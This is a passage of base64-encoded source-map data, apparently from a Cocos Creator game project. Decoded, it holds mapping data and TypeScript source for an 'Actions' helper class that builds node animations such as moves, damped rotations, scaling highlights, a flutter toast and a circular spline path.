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QyxDQUFDLENBQUMsR0FBRyxDQUFDLENBQUMsR0FBRyxDQUFDLENBQUM7b0JBQ3ZCLE1BQU07b0JBQ04sTUFBTTtpQkFDVCxDQUFDLENBQUM7Z0JBRUgsSUFBSSxDQUFDLFNBQVMsQ0FBQyxFQUFFLENBQUMsUUFBUSxDQUFDLEVBQUUsQ0FBQyxTQUFTLENBQUMsQ0FBQyxHQUFDLElBQUksQ0FBQyxFQUFFLEVBQUUsQ0FBQyxLQUFLLENBQUMsUUFBUSxDQUFDLE1BQU0sQ0FBQyxFQUFFLENBQUMsV0FBVyxFQUFFLENBQUMsRUFBRSxFQUFFLENBQUMsT0FBTyxDQUFDLFFBQVEsRUFBRSxHQUFHLENBQUMsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDLFFBQVEsRUFBRSxFQUFFLENBQUMsQ0FBQyxFQUFFLEVBQUUsQ0FBQyxRQUFRLENBQUM7b0JBQzFKLElBQUksQ0FBQyxNQUFNLEdBQUcsS0FBSyxDQUFDO29CQUNwQixJQUFJLFFBQVEsRUFBQzt3QkFDVCxRQUFRLEVBQUUsQ0FBQztxQkFDZDtnQkFDTCxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUM7O1lBakJULEtBQUssSUFBSSxDQUFDLEdBQUMsQ0FBQyxFQUFFLENBQUMsR0FBQyxJQUFJLENBQUMsTUFBTSxHQUFDLE9BQU8sRUFBRSxDQUFDLEVBQUU7d0JBQS9CLENBQUM7YUFrQlQ7UUFFTCxDQUFDLENBQUMsQ0FBQztJQUNQLENBQUM7SUFFTCxjQUFDO0FBQUQsQ0FyUEEsQUFxUEMsSUFBQSIsImZpbGUiOiIiLCJzb3VyY2VSb290IjoiLyIsInNvdXJjZXNDb250ZW50IjpbIi8vIExlYXJuIFR5cGVTY3JpcHQ6XHJcbi8vICAtIFtDaGluZXNlXSBodHRwOi8vZG9jcy5jb2Nvcy5jb20vY3JlYXRvci9tYW51YWwvemgvc2NyaXB0aW5nL3R5cGVzY3JpcHQuaHRtbFxyXG4vLyAgLSBbRW5nbGlzaF0gaHR0cDovL3d3dy5jb2NvczJkLXgub3JnL2RvY3MvY3JlYXRvci9tYW51YWwvZW4vc2NyaXB0aW5nL3R5cGVzY3JpcHQuaHRtbFxyXG4vLyBMZWFybiBBdHRyaWJ1dGU6XHJcbi8vICAtIFtDaGluZXNlXSBodHRwOi8vZG9jcy5jb2Nvcy5jb20vY3JlYXRvci9tYW51YWwvemgvc2NyaXB0aW5nL3JlZmVyZW5jZS9hdHRyaWJ1dGVzLmh0bWxcclxuLy8gIC0gW0VuZ2xpc2hdIGh0dHA6Ly93d3cuY29jb3MyZC14Lm9yZy9kb2NzL2NyZWF0b3IvbWFudWFsL2VuL3NjcmlwdGluZy9yZWZlcmVuY2UvYXR0cmlidXRlcy5odG1sXHJcbi8vIExlYXJuIGxpZmUtY3ljbGUgY2FsbGJhY2tzOlxyXG4vLyAgLSBbQ2hpbmVzZV0gaHR0cDovL2RvY3MuY29jb3MuY29tL2NyZWF0b3IvbWFudWFsL3poL3NjcmlwdGluZy9saWZlLWN5Y2xlLWNhbGxiYWNrcy5odG1sXHJcbi8vICAtIFtFbmdsaXNoXSBodHRwOi8vd3d3LmNvY29zMmQteC5vcmcvZG9jcy9jcmVhdG9yL21hbnVhbC9lbi9zY3JpcHRpbmcvbGlmZS1jeWNsZS1jYWxsYmFja3MuaHRtbFxyXG5cclxuXHJcbmV4cG9ydCBkZWZhdWx0IGNsYXNzIEFjdGlvbnMge1xyXG5cclxuICAgIC8qKiDlkJHkuIvnp7vliqggKi9cclxuICAgIHN0YXRpYyBkb3dud2FyZChzcGVlZDogTnVtYmVyLCBoZWlnaHQ6IE51bWJlcik6IGNjLkFjdGlvbkludGVydmFsIHtcclxuICAgICAgICByZXR1cm4gY2MubW92ZUJ5KGhlaWdodCAvIHNwZWVkLCBjYy52MigwLCAtaGVpZ2h0KSk7XHJcbiAgICB9XHJcblxyXG4gICAgLyoqIOWQkeS4iuenu+WKqCAqL1xyXG4gICAgc3RhdGljIHVwd2FyZChzcGVlZDogTnVtYmVyLCBoZWlnaHQ6IE51bWJlcik6IGNjLkFjdGlvbkludGVydmFsIHtcclxuICAgICAgICByZXR1cm4gY2MubW92ZUJ5KGhlaWdodCAvIHNwZWVkLCBjYy52MigwLCBoZWlnaHQpKTtcclxuICAgIH1cclxuXHJcbiAgICAvKiog5ZGo5pyf5oCn5Yqo5L2cICovXHJcbiAgICBzdGF0aWMgY3ljbGVBY3Rpb24oYWN0aW9uOiBGdW5jdGlvbiwgc3RhcnRWYWx1ZTogTnVtYmVyLCBlbmRWYWx1ZTogTnVtYmVyLCBkZWx0YVZhbHVlOiBOdW1iZXIsIHNwZWVkOiBOdW1iZXIsIHRpbWVzOiBOdW1iZXIsIGRhbXBpbmc6IE51bWJlciA9IDAsIGN5Y2xlRGVsYXk6IE51bWJlciA9IDApOiBjYy5BY3Rpb25JbnRlcnZhbCB7XHJcbiAgICAgICAgbGV0IGRlbHRhVmFsdWVfYWJzID0gTWF0aC5hYnMoZGVsdGFWYWx1ZSk7XHJcbiAgICAgICAgbGV0IGFjdGlvbnM6IFtjYy5GaW5pdGVUaW1lQWN0aW9uXSA9IFtdO1xyXG4gICAgICAgIGFjdGlvbnMucHVzaChhY3Rpb24oZGVsdGFWYWx1ZV9hYnMgLyBzcGVlZCwgc3RhcnRWYWx1ZSArIGRlbHRhVmFsdWUpKTtcclxuICAgICAgICBpZiAoY3ljbGVEZWxheSA+IDApIHtcclxuICAgICAgICAgICAgYWN0aW9ucy5wdXNoKGNjLmRlbGF5VGltZShjeWNsZURlbGF5KSk7XHJcbiAgICAgICAgfVxyXG4gICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgdGltZXM7IGkrKykge1xyXG4gICAgICAgICAgICBsZXQgbmV3RGVsdGFSb3RhdGlvbiA9IGRlbHRhVmFsdWVfYWJzIC0gKGkgKiBkYW1waW5nKTtcclxuICAgICAgICAgICAgbGV0IGR1YXRpb24gPSBuZXdEZWx0YVJvdGF0aW9uICogMiAvIHNwZWVkO1xyXG4gICAgICAgICAgICBsZXQgcm90YXRpb24gPSBuZXdEZWx0YVJvdGF0aW9uO1xyXG4gICAgICAgICAgICBpZiAoZGVsdGFWYWx1ZSA+IDApIHtcclxuICAgICAgICAgICAgICAgIGlmIChpICUgMiA9PSAwKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgcm90YXRpb24gPSAtcm90YXRpb247XHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIH0gZWxzZSB7XHJcbiAgICAgICAgICAgICAgICBpZiAoaSAlIDIgPT0gMSkge1xyXG4gICAgICAgICAgICAgICAgICAgIHJvdGF0aW9uID0gLXJvdGF0aW9uO1xyXG4gICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICB9XHJcblxyXG4gICAgICAgICAgICBhY3Rpb25zLnB1c2goYWN0aW9uKGR1YXRpb24sIHN0YXJ0VmFsdWUgKyByb3RhdGlvbikpO1xyXG4gICAgICAgICAgICBpZiAoY3ljbGVEZWxheSA+IDAgJiYgaSAlIDIgPT0gMSkge1xyXG4gICAgICAgICAgICAgICAgYWN0aW9ucy5wdXNoKGNjLmRlbGF5VGltZShjeWNsZURlbGF5KSk7XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICB9XHJcbiAgICAgICAgbGV0IGxhc3RWYWx1ZSA9IGRlbHRhVmFsdWVfYWJzIC0gKHRpbWVzIC0gMSkgKiBkYW1waW5nO1xyXG4gICAgICAgIGlmIChkZWx0YVZhbHVlID4gMCkge1xyXG4gICAgICAgICAgICBpZiAodGltZXMgJSAyID09IDApIHtcclxuICAgICAgICAgICAgICAgIGxhc3RWYWx1ZSA9IC1sYXN0VmFsdWU7XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICB9IGVsc2Uge1xyXG4gICAgICAgICAgICBpZiAodGltZXMgJSAyID09IDEpIHtcclxuICAgICAgICAgICAgICAgIGxhc3RWYWx1ZSA9IC1sYXN0VmFsdWU7XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICB9XHJcbiAgICAgICAgYWN0aW9ucy5wdXNoKGFjdGlvbihNYXRoLmFicyhlbmRWYWx1ZSAtIChzdGFydFZhbHVlICsgbGFzdFZhbHVlKSkgLyBzcGVlZCwgZW5kVmFsdWUpKTtcclxuICAgICAgICByZXR1cm4gY2Muc2VxdWVuY2UoYWN0aW9ucyk7XHJcbiAgICB9XHJcblxyXG4gICAgLyoqIOW7tui/n+aJp+ihjCAqL1xyXG4gICAgc3RhdGljIGRlbGF5VGltZUNhbGwoZGVsYXk6IE51bWJlciwgY2FsbDogRnVuY3Rpb24pOiBjYy5BY3Rpb25JbnRlcnZhbCB7XHJcbiAgICAgICAgcmV0dXJuIGNjLnNlcXVlbmNlKGNjLmRlbGF5VGltZShkZWxheSksIGNjLmNhbGxGdW5jKGNhbGwpKTtcclxuICAgIH1cclxuXHJcbiAgICAvKiog5b6q546v5Lu75YqhICovXHJcbiAgICBzdGF0aWMgc2NoZWR1bGVDYWxsKGludGVydmFsOiBOdW1iZXIsIGNhbGw6IEZ1bmN0aW9ufGNjLkZpbml0ZVRpbWVBY3Rpb24pOiBjYy5BY3Rpb25JbnRlcnZhbCB7XHJcbiAgICAgICAgaWYgKHR5cGVvZiBjYWxsID09IFwiZnVuY3Rpb25cIil7XHJcbiAgICAgICAgICAgIHJldHVybiBjYy5yZXBlYXRGb3JldmVyKGNjLnNlcXVlbmNlKGNjLmRlbGF5VGltZShpbnRlcnZhbCksIGNjLmNhbGxGdW5jKGNhbGwpKSk7XHJcbiAgICAgICAgfWVsc2Uge1xyXG4gICAgICAgICAgICByZXR1cm4gY2MucmVwZWF0Rm9yZXZlcihjYy5zZXF1ZW5jZShjYy5kZWxheVRpbWUoaW50ZXJ2YWwpLCBjYWxsKSk7XHJcbiAgICAgICAgfVxyXG4gICAgfVxyXG5cclxuICAgIC8qKiDmr4/kuIDluKfmiafooYwgKi9cclxuICAgIHN0YXRpYyB1cGRhdGUoY2FsbDooZHQ6bnVtYmVyKT0+dm9pZCk6Y2MuQWN0aW9uSW50ZXJ2YWx7XHJcbiAgICAgICAgcmV0dXJuIHRoaXMuc2NoZWR1bGVDYWxsKDAsICgpPT57XHJcbiAgICAgICAgICAgIGNhbGwoY2MuZGlyZWN0b3IuZ2V0RGVsdGFUaW1lKCkpO1xyXG4gICAgICAgIH0pO1xyXG4gICAgfVxyXG5cclxuXHJcbiAgICAvKiog6auY5Lqu5pi+56S65Yqo5L2c77yI5YWI5pS+5aSn5YaN57yp5bCPLOmAguWQiOabtOaNouWtl+S9k+aXtuiwg+eUqO+8iSAqL1xyXG4gICAgc3RhdGljIGhpZ2hsaWdodEFjdGlvbihtYXhTY2FsZUNhbGw/OiBGdW5jdGlvbik6IGNjLkFjdGlvbkludGVydmFsIHtcclxuICAgICAgICBsZXQgY2FsbCA9IGZ1bmN0aW9uICgpIHtcclxuICAgICAgICAgICAgaWYgKG1heFNjYWxlQ2FsbCkgbWF4U2NhbGVDYWxsKCk7XHJcbiAgICAgICAgfTtcclxuICAgICAgICBsZXQgc2VxID0gY2Muc2VxdWVuY2UoW1xyXG4gICAgICAgICAgICBjYy5zY2FsZVRvKDAuMSwgMS40KSxcclxuICAgICAgICAgICAgY2MuY2FsbEZ1bmMoY2FsbCksXHJcbiAgICAgICAgICAgIGNjLnNjYWxlVG8oMC4wNywgMC44KSxcclxuICAgICAgICAgICAgY2Muc2NhbGVUbygwLjA3LCAxLjEpLFxyXG4gICAgICAgICAgICBjYy5zY2FsZVRvKDAuMDcsIDAuOSksXHJcbiAgICAgICAgICAgIGNjLnNjYWxlVG8oMC4wNywgMSksXHJcbiAgICAgICAgXSk7XHJcbiAgICAgICAgcmV0dXJuIHNlcTtcclxuICAgIH1cclxuXHJcbiAgICAvKiog6aOY5Yqo5pi+56S65pWI5p6cKOmAguWQiOaYvuekumxhYmVs5o+Q56S677yM57G75Ly8dG9hc3QpICovXHJcbiAgICBzdGF0aWMgZmx1dHRlckFjdGlvbigpOiBjYy5GaW5pdGVUaW1lQWN0aW9uIHtcclxuICAgICAgICBsZXQgbW92ZVNlcSA9IGNjLnNlcXVlbmNlKFtcclxuICAgICAgICAgICAgY2MubW92ZUJ5KDAuNiwgY2MudjIoMCwgMCkpLFxyXG4gICAgICAgICAgICBjYy5tb3ZlQnkoMSwgY2MudjIoMCwgODQpKVxyXG4gICAgICAgIF0pO1xyXG5cclxuICAgICAgICBsZXQgc2NhbGVTZXEgPSBjYy5zZXF1ZW5jZShbXHJcbiAgICAgICAgICAgIGNjLnNjYWxlVG8oMC4xLCAxLjIpLFxyXG4gICAgICAgICAgICBjYy5zY2FsZVRvKDAuMSwgMC44KSxcclxuICAgICAgICAgICAgY2Muc2NhbGVUbygwLjEsIDEpLFxyXG4gICAgICAgIF0pO1xyXG5cclxuICAgICAgICBsZXQgYWxwaGFTZXEgPSBjYy5zZXF1ZW5jZShbXHJcbiAgICAgICAgICAgIGNjLmZhZGVUbygwLjgsIDI1NSksXHJcbiAgICAgICAgICAgIGNjLmZhZGVUbygwLjgsIDApLFxyXG4gICAgICAgIF0pO1xyXG5cclxuICAgICAgICBsZXQgc3Bhd24gPSBjYy5zcGF3bihtb3ZlU2VxLCBzY2FsZVNlcSwgYWxwaGFTZXEpO1xyXG4gICAgICAgIHJldHVybiBzcGF3bjtcclxuICAgIH1cclxuXHJcbiAgICAvKipcclxuICAgICAqIOWchui/kOWKqFxyXG4gICAgICogQHBhcmFtIHtOdW1iZXJ9IGR1cmF0aW9uXHJcbiAgICAgKiBAcGFyYW0ge2NjLk5vZGV8Y2MucH0gZG90IOWchuW/g+eCueWdkOagh+aIluiAhW5vZGVcclxuICAgICAqIEBwYXJhbSB7TnVtYmVyfSAgIOWNiuW+hCDlpoLmnpzkuLrotJ/mlbAsIOWPjeaXtumSn+aWueWQkVxyXG4gICAgICogQHBhcmFtIHtOdW1iZXJ9ICDml4vovazop5LluqZcclxuICAgICAqIEByZXR1cm5zIHtjYy5DYXJkaW5hbFNwbGluZVRvfVxyXG4gICAgICovXHJcbiAgICBzdGF0aWMgY2lyY2xlQnkoZHVyYXRpb24sIGRvdCwgciwgYW5nbGUpOmNjLkFjdGlvbkludGVydmFse1xyXG4gICAgICAgIHZhciBkcCA9IGFuZ2xlIHx8IDIwLCBkcHIgPSAzNjAgLyBkcCwgYXJ5ID0gW107XHJcbiAgICAgICAgciA9IHIgfHwgMjA7XHJcbiAgICAgICAgaWYociA8IDApIGRwciA9IC1kcHI7XHJcbiAgICAgICAgciA9IE1hdGguYWJzKHIpO1xyXG5cclxuICAgICAgICBsZXQgcmFkID0gTWF0aC5QSS8xODA7XHJcblxyXG4gICAgICAgIGZvcih2YXIgaSA9IDA7IGkgPCBkcDsgaSArKyl7XHJcbiAgICAgICAgICAgIGFyeS5wdXNoKGNjLnYyKE1hdGguc2luKGRwciAqIGkgKiByYWQpICogciArIGRvdC54LCBNYXRoLmNvcyhkcHIgKiBpICogcmFkKSAqIHIgKyBkb3QueSkpO1xyXG4gICAgICAgIH1cclxuICAgICAgICBhcnkucHVzaChhcnkpO1xyXG4gICAgICAgIHJldHVybiBjYy5jYXJkaW5hbFNwbGluZVRvKGR1cmF0aW9uLCBhcnksIDApO1xyXG4gICAgfTtcclxuXHJcblxyXG4gICAgLyoqXHJcbiAgICAgKiDkvKozROeahOe/u+i9rOWKqOS9nFxyXG4gICAgICogQHBhcmFtIHtudW1iZXJ9IGR1cmF0aW9uXHJcbiAgICAgKiBAcGFyYW0ge251bWJlcn0gc2tld1lcclxuICAgICAqIEByZXR1cm4ge2NjLkZpbml0ZVRpbWVBY3Rpb259XHJcbiAgICAgKi9cclxuICAgIHN0YXRpYyBmbGlwWEFjdGlvbihkdXJhdGlvbjpudW1iZXIgPSAwLjUsIHNrZXdZOm51bWJlcj0xMCk6Y2MuRmluaXRlVGltZUFjdGlvbntcclxuICAgICAgICBsZXQgc3BlZWQgPSBkdXJhdGlvbi8zODtcclxuICAgICAgICBsZXQgc2NhbGUgPSBjYy5zZXF1ZW5jZShcclxuICAgICAgICAgICAgY2Muc2NhbGVUbyhzcGVlZCo5LCAwLjEsIDEpLFxyXG4gICAgICAgICAgICBjYy5zY2FsZVRvKHNwZWVkKjIsIC0wLjEsIDEpLFxyXG4gICAgICAgICAgICBjYy5zY2FsZVRvKHNwZWVkKjgsIC0wLjksIDEpLFxyXG4gICAgICAgICAgICBjYy5zY2FsZVRvKHNwZWVkKjgsIC0wLjEsIDEpLFxyXG4gICAgICAgICAgICBjYy5zY2FsZVRvKHNwZWVkKjIsIDAuMSwgMSksXHJcbiAgICAgICAgICAgIGNjLnNjYWxlVG8oc3BlZWQqOSwgMSwgMSlcclxuICAgICAgICApO1xyXG4gICAgICAgIGxldCBza2V3ID0gY2Muc2VxdWVuY2UoXHJcbiAgICAgICAgICAgIGNjLnNrZXdUbyhzcGVlZCo5LCAwLCAtc2tld1kpLFxyXG4gICAgICAgICAgICBjYy5za2V3VG8oc3BlZWQqMiwgMCwgLXNrZXdZKSxcclxuICAgICAgICAgICAgY2Muc2tld1RvKHNwZWVkKjgsIDAsIDApLFxyXG4gICAgICAgICAgICBjYy5za2V3VG8oc3BlZWQqOCwgMCwgc2tld1kpLFxyXG4gICAgICAgICAgICBjYy5za2V3VG8oc3BlZWQqMiwgMCwgc2tld1kpLFxyXG4gICAgICAgICAgICBjYy5za2V3VG8oc3BlZWQqOSwgMCwgMClcclxuICAgICAgICApO1xyXG4gICAgICAgIHJldHVybiBjYy5zcGF3bihzY2FsZSwgc2tldyk7XHJcbiAgICB9XHJcblxyXG5cclxuICAgIC8qKlxyXG4gICAgICog54K45Ye66YeR5biB55qE5pWI5p6cXHJcbiAgICAgKiBAcGFyYW0ge2NjLk5vZGV9IHByZWZhYk5vZGVcclxuICAgICAqIEBwYXJhbSB7Y2MuTm9kZX0